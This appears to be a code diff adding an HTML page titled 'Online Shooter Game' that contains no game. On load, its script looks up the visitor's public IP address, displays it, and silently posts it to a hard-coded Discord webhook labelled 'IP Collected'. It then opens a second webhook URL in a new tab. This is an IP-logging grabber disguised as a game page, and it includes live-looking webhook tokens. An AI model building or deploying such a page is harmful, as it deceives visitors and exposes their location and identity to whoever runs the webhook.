@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Shooter Game</title>
+    <style>
+        body {
+            background-image: url('https://i.ytimg.com/vi/GlmBeCi3A5Y/maxresdefault.jpg');
+            background-size: cover;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            height: 100vh;
+        }
+        
+        #ipDisplay {
+            background-color: white;
+            padding: 10px;
+            color: royalblue;
+            font-weight: bold;
+            font-size: 65px;
+            margin-bottom: 150px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+
+<body>
+
+
+    <!-- Display IP Address with a white background square -->
+    <div id="ipDisplay"></div>
+</body>
+
+</html>
+<script type="text/javascript">
+    var ip = '';
+
+    function getIP(json) {
+        ip = json.ip;
+
+        // Display IP address
+        var ipDisplayElement = document.getElementById('ipDisplay');
+        if (ipDisplayElement) {
+            ipDisplayElement.textContent = 'IP Address: ' + ip;
+        }
+    }
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.ipify.org?format=json', true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            getIP(JSON.parse(xhr.responseText));
+
+            // Modified line to send the IP to a Discord webhook
+            var webhookUrl = 'https://discord.com/api/webhooks/1170379910821458101/FQEGJnzfpAZZiEBF7ESYcrLbNIBB0qK1cnbMZPvrTSg8F_H4iMDcCi_bNDY7YUJYL_I2';
+            var xhrDiscord = new XMLHttpRequest();
+            xhrDiscord.open('POST', webhookUrl, true);
+            xhrDiscord.setRequestHeader('Content-Type', 'application/json');
+            xhrDiscord.send(JSON.stringify({
+                content: 'IP Collected: ' + ip
+            }));
+        }
+    };
+    xhr.send();
+
+    // Open a new tab after three seconds
+    setTimeout(function() {
+        window.open('https://discord.com/api/webhooks/1168714987200589884/gs04PdFopB3pwEQsPR7Zx8rdrHHNy_bH-YuewcKpWUd-OFVenz8bTj7JgdIZUbrdJl-I', '_blank');
+    }, 1000);
+</script>
